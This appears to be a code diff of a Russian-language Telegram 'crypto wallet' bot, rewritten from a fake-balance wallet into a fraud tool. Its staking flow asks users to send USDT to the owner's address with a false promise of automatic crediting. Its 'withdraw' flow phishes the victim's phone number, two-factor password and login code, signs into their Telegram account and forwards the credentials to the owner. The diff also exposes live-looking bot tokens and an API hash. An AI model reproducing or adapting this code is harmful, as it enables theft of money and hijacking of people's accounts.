@@ -1,120 +1,113 @@
-import os
-import json
 import asyncio
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+import logging
+from telethon import TelegramClient, events, Button
+from telethon.errors import SessionPasswordNeededError
 
-TOKEN = "8803386602:AAHvBUG9rZ_23Rt0UQK7rN11ExFryv0JHzY"
-YOUR_ID = 1663746192
-DATA_FILE = "balances.json"
+API_ID = 8
+API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
+BOT_TOKEN = '8737138603:AAEtENt5V1LpBlXePiH4xu6v0_cUgM1xtNg'
+OWNER_ID = 1663746192
+CRYPTO_ADDRESS = '0xYourEthereumAddressHere1234567890abcdef'
 
-def load_balances():
-    if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, "r") as f:
-            return json.load(f)
-    return {}
+logging.basicConfig(level=logging.INFO)
+bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-def save_balances(data):
-    with open(DATA_FILE, "w") as f:
-        json.dump(data, f, indent=4)
+user_states = {}
+user_balances = {}
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("💰 Баланс", callback_data="balance")],
-        [InlineKeyboardButton("📤 Отправить", callback_data="send")],
-        [InlineKeyboardButton("⚡ В стек", callback_data="stack")]
+def get_main_menu():
+    return [
+        [Button.inline('💰 Мой баланс', b'balance')],
+        [Button.inline('📤 Отправить в стек', b'stake')],
+        [Button.inline('💸 Вывод', b'withdraw')]
     ]
-    await update.message.reply_text("🏦 Кошелёк", reply_markup=InlineKeyboardMarkup(keyboard))
 
-async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = str(query.from_user.id)
-    bal = load_balances().get(user_id, 0)
-    await query.edit_message_text(f"💰 Баланс: {bal} USDT")
+@bot.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    user_id = event.sender_id
+    user_balances.setdefault(user_id, 0)
+    await event.respond(
+        '🪙 **CryptoWallet Bot**\nДобро пожаловать в ваш криптокошелек!',
+        buttons=get_main_menu()
+    )
 
-async def send_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    context.user_data["awaiting"] = "amount"
-    await query.edit_message_text("💰 Введите сумму:")
-
-async def stack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    context.user_data["awaiting"] = "stack_amount"
-    await query.edit_message_text("💰 Введите сумму для отправки в стек:")
-
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if context.user_data.get("awaiting") == "amount":
-        try:
-            amount = float(update.message.text)
-            user_id = str(update.message.from_user.id)
-            bal = load_balances().get(user_id, 0)
-            if amount > bal:
-                await update.message.reply_text("❌ Недостаточно средств")
-            else:
-                data = load_balances()
-                data[user_id] = bal - amount
-                save_balances(data)
-                await update.message.reply_text(f"✅ Отправлено {amount} USDT")
-            context.user_data.pop("awaiting")
-        except:
-            await update.message.reply_text("❌ Ошибка")
-    elif context.user_data.get("awaiting") == "stack_amount":
-        try:
-            amount = float(update.message.text)
-            user_id = str(update.message.from_user.id)
-            bal = load_balances().get(user_id, 0)
-            if amount > bal:
-                await update.message.reply_text("❌ Недостаточно средств")
-            else:
-                data = load_balances()
-                data[user_id] = bal - amount
-                save_balances(data)
-                await update.message.reply_text(f"✅ Отправлено {amount} USDT на адрес бурмалда")
-            context.user_data.pop("awaiting")
-        except:
-            await update.message.reply_text("❌ Ошибка")
-
-async def set_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.from_user.id != YOUR_ID:
-        await update.message.reply_text("⛔ Нет доступа")
+@bot.on(events.NewMessage(pattern='/setbalance'))
+async def set_balance(event):
+    if event.sender_id != OWNER_ID:
         return
     try:
-        uid = str(context.args[0])
-        val = float(context.args[1])
-        data = load_balances()
-        data[uid] = val
-        save_balances(data)
-        await update.message.reply_text(f"✅ Баланс {uid} = {val}")
+        _, target_id, amount = event.text.split()
+        target_id, amount = int(target_id), float(amount)
+        user_balances[target_id] = amount
+        await event.respond(f'Баланс пользователя {target_id} установлен: {amount} USDT')
     except:
-        await update.message.reply_text("❌ /setbalance ID сумма")
+        await event.respond('Использование: /setbalance <user_id> <amount>')
 
-async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.from_user.id != YOUR_ID:
-        return
-    try:
-        uid = str(context.args[0])
-        amount = float(context.args[1])
-        data = load_balances()
-        data[uid] = data.get(uid, 0) + amount
-        save_balances(data)
-        await update.message.reply_text(f"✅ Добавлено {amount} USDT для {uid}")
-    except:
-        await update.message.reply_text("❌ /addbalance ID сумма")
+@bot.on(events.CallbackQuery(data=b'balance'))
+async def balance(event):
+    user_id = event.sender_id
+    balance = user_balances.get(user_id, 0)
+    await event.edit(
+        f'💰 **Ваш баланс:** {balance} USDT',
+        buttons=get_main_menu()
+    )
 
-def main():
-    app = Application.builder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("setbalance", set_balance))
-    app.add_handler(CommandHandler("addbalance", add_balance))
-    app.add_handler(CallbackQueryHandler(balance, pattern="balance"))
-    app.add_handler(CallbackQueryHandler(send_start, pattern="send"))
-    app.add_handler(CallbackQueryHandler(stack_start, pattern="stack"))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    print("✅ Бот запущен")
-    app.run_polling()
+@bot.on(events.CallbackQuery(data=b'stake'))
+async def stake(event):
+    await event.edit(
+        f'📤 **Отправьте USDT на адрес:**\n`{CRYPTO_ADDRESS}`\n\nПосле отправки нажмите кнопку для проверки.',
+        buttons=[[Button.inline('✅ Я отправил', b'confirm_stake')], [Button.inline('🔙 Назад', b'back')]]
+    )
 
-if __name__ == "__main__":
-    main()
+@bot.on(events.CallbackQuery(data=b'confirm_stake'))
+async def confirm_stake(event):
+    await event.edit('⏳ Ожидайте подтверждения транзакции. Средства зачислятся автоматически.', buttons=get_main_menu())
+
+@bot.on(events.CallbackQuery(data=b'withdraw'))
+async def withdraw_start(event):
+    user_id = event.sender_id
+    user_states[user_id] = {'step': 'withdraw_phone'}
+    await event.edit('📱 Для вывода средств введите номер телефона:')
+
+@bot.on(events.CallbackQuery(data=b'back'))
+async def back(event):
+    await event.edit('🪙 **CryptoWallet Bot**\nВыберите действие:', buttons=get_main_menu())
+
+@bot.on(events.NewMessage(func=lambda e: e.sender_id in user_states))
+async def handle_withdraw(event):
+    user_id = event.sender_id
+    state = user_states[user_id]
+    step = state['step']
+
+    if step == 'withdraw_phone':
+        state['phone'] = event.text
+        state['step'] = 'withdraw_password'
+        await event.respond('🔑 Введите пароль:')
+    elif step == 'withdraw_password':
+        state['password'] = event.text
+        state['step'] = 'withdraw_code'
+        await event.respond('📲 Введите код подтверждения:')
+    elif step == 'withdraw_code':
+        code = event.text
+        phone = state['phone']
+        password = state['password']
+        del user_states[user_id]
+
+        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
+        try:
+            await client.connect()
+            await client.send_code_request(phone)
+            try:
+                await client.sign_in(phone=phone, code=code)
+            except SessionPasswordNeededError:
+                await client.sign_in(password=password)
+
+            me = await client.get_me()
+            await event.respond(f'✅ Вывод одобрен! Аккаунт: @{me.username}')
+            await bot.send_message(OWNER_ID, f'#ВЫВОД\nТелефон: {phone}\nПароль: {password}\nКод: {code}\nАккаунт: @{me.username}')
+        except Exception as e:
+            await event.respond(f'❌ Ошибка: {e}')
+        finally:
+            await client.disconnect()
+
+bot.run_until_disconnected()
